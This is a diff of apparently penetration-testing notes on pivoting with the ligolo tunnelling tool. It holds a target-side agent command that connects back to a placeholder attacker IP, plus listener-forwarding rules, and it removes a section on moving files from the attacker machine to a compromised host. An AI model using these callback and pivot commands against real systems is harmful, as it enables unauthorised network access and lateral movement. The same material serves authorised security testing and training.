@@ -342,21 +342,17 @@ tunnel_start --tun ligolo
 
 ```bash
 # Target
-.\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
+.\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert -retry
 
 # ATTACKER: ligolo session
 session
 tunnel_start --tun ligolo
 ```
 
-### File Transfer
+### Tunnels
 
-This example shows how the target could request files from the attacker machine
+Callbacks do **not** work automatically but can be enabled via a tunnel
 
 ```bash
-python3 -m http.server <ATTACKER_FORWARD_PORT>
-listener_add --addr 0.0.0.0:<TARGET_LISTEN_PORT> --to 127.0.0.1:<ATTACKER_FORWARD_PORT> --tcp
-
-# Example request
-Invoke-WebRequest -Uri "http://<TARET>:<TARGET_LISTEN_PORT>/<FILE>"
+listener_add --addr 0.0.0.0:<PIVOT_PORT> --to 127.0.0.1:<ATTACKER_PORT> --tcp
 ```
